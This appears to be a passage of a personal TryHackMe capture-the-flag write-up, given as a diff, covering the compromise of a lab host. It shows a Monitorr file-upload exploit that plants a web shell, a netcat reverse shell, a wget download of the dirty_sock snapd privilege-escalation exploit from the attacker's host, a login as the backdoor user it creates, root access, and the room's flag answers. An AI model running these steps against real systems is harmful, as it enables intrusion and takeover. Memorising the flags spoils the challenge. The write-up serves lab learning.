@@ -311,3 +311,160 @@ else:
 
     print ("A shell script should be uploaded. Now we try to execute it")
     url = sys.argv[1] + "/assets/data/usrimg/she_ll.jpg.phtml"
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
+    sess.get(url, headers=headers)
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python 48980.py https://monitorr.robyns-petshop.thm/ 10.8.19.103 443
+<div id='uploadreturn'>File she_ll1.jpg.phtml is an image: <br><div id='uploadok'>File she_ll1.jpg.phtml has been uploaded to: ../data/usrimg/she_ll1.jpg.phtml</div></div>
+A shell script should be uploaded. Now we try to execute it
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 443 
+listening on [any] 443 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.254.180] 53542
+bash: cannot set terminal process group (903): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@petshop:/var/www/monitorr/assets/data/usrimg$ id
+id
+www-data@petshop:/var/www/monitorr/assets/data/usrimg$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+<img$ python3 -c 'import pty;pty.spawn("/bin/bash")' 
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@petshop:/var/www/monitorr/assets/data/usrimg$ ip a
+ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
+    link/ether 02:38:f7:c8:da:5b brd ff:ff:ff:ff:ff:ff
+    inet 10.10.254.180/16 brd 10.10.255.255 scope global dynamic eth0
+       valid_lft 844sec preferred_lft 844sec
+    inet6 fe80::38:f7ff:fec8:da5b/64 scope link 
+       valid_lft forever preferred_lft forever
+www-data@petshop:/var/www/monitorr/assets/data/usrimg$ ls /var/www
+ls /var/www
+dev
+flag1.txt
+www-data@petshop:/var/www/monitorr/assets/data/usrimg$ cat /var/www/flag1.txt
+cat /var/www/flag1.txt
+THM{MjBkOTMyZDgzNGZmOGI0Y2I5NTljNGNl}
+
+www-data@petshop:/var/www/monitorr/assets/data/usrimg$ apt list --upgradeable
+apt list --upgradeable
+
+WARNING: apt does not have a stable CLI interface. Use with caution in scripts.
+
+Listing...
+apache2/bionic-updates,bionic-security 2.4.29-1ubuntu4.27 amd64 [upgradable from: 2.4.29-1ubuntu4.14]
+snapd/bionic-updates,bionic-security 2.58+18.04.1 amd64 [upgradable from: 2.32.5+18.04]
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ searchsploit -m 46362
+  Exploit: snapd < 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (2)
+      URL: https://www.exploit-db.com/exploits/46362
+     Path: /usr/share/exploitdb/exploits/linux/local/46362.py
+    Codes: CVE-2019-7304
+ Verified: False
+File Type: Python script, ASCII text executable, with very long lines (420)
+Copied to: /home/witty/Downloads/46362.py
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ dos2unix 46362.py
+dos2unix: converting file 46362.py to Unix format...
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ systemctl stop docker
+Warning: Stopping docker.service, but it can still be activated by:
+  docker.socket
+                                                                                                               
+┌──(witty㉿kali)-[~/Downloads]
+└─$ sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+www-data@petshop:/var/www/monitorr/assets/data/usrimg$ cd /tmp
+cd /tmp
+www-data@petshop:/tmp$ wget http://10.8.19.103/46362.py
+wget http://10.8.19.103/46362.py
+--  http://10.8.19.103/46362.py
+Connecting to 10.8.19.103:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 13496 (13K) [text/x-python]
+Saving to: '46362.py'
+
+46362.py            100%[===================>]  13.18K  65.4KB/s    in 0.2s    
+
+(65.4 KB/s) - '46362.py' saved [13496/13496]
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.193.65 - - [29/Jun/2023 13:05:18] "GET /46362.py HTTP/1.1" 200 -
+
+www-data@petshop:/tmp$ chmod +x 46362.py 
+chmod +x 46362.py 
+www-data@petshop:/tmp$ ./46362.py
+./46362.py
+
+      ___  _ ____ ___ _   _     ____ ____ ____ _  _
+      |  \ | |__/  |   \_/      [__  |  | |    |_/
+      |__/ | |  \  |    |   ___ ___] |__| |___ | \_
+                       (version 2)
+
+//=========[]==========================================\\
+|| R&D     || initstring (@init_string)                ||
+|| Source  || https://github.com/initstring/dirty_sock ||
+|| Details || https://initblog.com/2019/dirty-sock     ||
+\\=========[]==========================================//
+
+[+] Slipped dirty sock on random socket file: /tmp/utntuvhgbo;uid=0;
+[+] Binding to socket file...
+[+] Connecting to snapd API...
+[+] Deleting trojan snap (and sleeping 5 seconds)...
+[+] Installing the trojan snap (and sleeping 8 seconds)...
+[+] Deleting trojan snap (and sleeping 5 seconds)...
+Traceback (most recent call last):
+  File "./46362.py", line 330, in <module>
+    main()
+  File "./46362.py", line 320, in main
+    delete_snap(client_sock)
+  File "./46362.py", line 205, in delete_snap
+    http_reply = client_sock.recv(8192).decode("utf-8")
+ConnectionResetError: [Errno 104] Connection reset by peer
+www-data@petshop:/tmp$ grep "dirty_sock" /etc/passwd
+grep "dirty_sock" /etc/passwd
+dirty_sock:x:1001:1001::/home/dirty_sock:/bin/bash
+www-data@petshop:/tmp$ su dirty_sock
+su dirty_sock
+Password: dirty_sock
+
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+dirty_sock@petshop:/tmp$ sudo -s
+sudo -s
+[sudo] password for dirty_sock: dirty_sock
+
+root@petshop:/tmp# cd /root
+cd /root
+root@petshop:/root# ls
+ls
+root.txt  snap
+root@petshop:/root# cat root.txt
+cat root.txt
+THM{YjMyZTkwYzZhM2U5MGEzZDU2MDc1NTMx}
+```
+![[Pasted image 20230629112821.png]]
+![[Pasted image 20230629113911.png]]
+Flag 1
+Root Flag
+
+## Flags / Answers
+- ***THM{MjBkOTMyZDgzNGZmOGI0Y2I5NTljNGNl}***
+- ***THM{YjMyZTkwYzZhM2U5MGEzZDU2MDc1NTMx}***
+
+## Notes / Lessons Learned
+[[Year of the Pig]]
+
